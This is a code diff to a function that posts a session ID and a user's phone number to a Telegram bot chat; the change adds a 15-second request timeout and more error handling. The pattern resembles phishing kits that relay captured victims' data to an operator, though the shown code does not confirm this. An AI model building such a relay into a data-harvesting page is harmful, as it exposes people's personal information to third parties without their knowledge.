@@ -305,32 +305,46 @@ export const sendPhoneToTelegramEnhanced = async (
 
     console.log("📤 Sending message to Telegram:", { sessionId, phoneNumber });
 
-    const response = await fetch(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: "HTML",
-          reply_markup: {
-            inline_keyboard: [], // No buttons initially
-          },
-        }),
-      },
-    );
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout
 
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error("❌ Telegram send error:", {
-        status: response.status,
-        error: errorText,
-      });
-      throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
-    }
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [], // No buttons initially
+            },
+          }),
+          signal: controller.signal,
+        },
+      );
+
+      clearTimeout(timeoutId);
+
+      if (!response.ok) {
+        let errorText;
+        try {
+          errorText = await response.text();
+        } catch {
+          errorText = `HTTP ${response.status} ${response.statusText}`;
+        }
+
+        console.error("❌ Telegram send error:", {
+          status: response.status,
+          statusText: response.statusText,
+          error: errorText,
+        });
+        throw new Error(`Telegram API error: ${response.status} - ${errorText}`);
+      }
 
     const result = await response.json();
     session.messageId = result.result.message_id;
